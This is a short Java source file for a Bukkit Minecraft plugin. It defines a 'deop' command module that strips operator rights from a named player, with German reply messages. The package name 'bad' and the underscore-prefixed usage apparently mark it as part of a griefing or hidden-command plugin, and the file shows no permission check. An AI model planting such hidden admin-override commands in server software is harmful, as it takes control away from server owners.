package me.maiko.modules.player.bad;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import me.maiko.main.Main;
import me.maiko.module.Module;

public class Deop_Mod extends Module{
	
	public Deop_Mod() {
		super("deop");
	}
	@Override
	public void onCommand(String[] args, Player p) {

		if (args.length == 2) {
			Player t = Bukkit.getPlayer(args[1]);
			if (t.isOnline()) {
				t.setOp(false);

				p.sendMessage(Main.Prefix + "Du hast diesen Spieler De-Oped!");

			} else {
				p.sendMessage(Main.Prefix + "Dieser Spieler ist nicht Online!");

			}

		} else {
			p.sendMessage(Main.Prefix + "Nutze _deop <Player>");

		}
	}
}
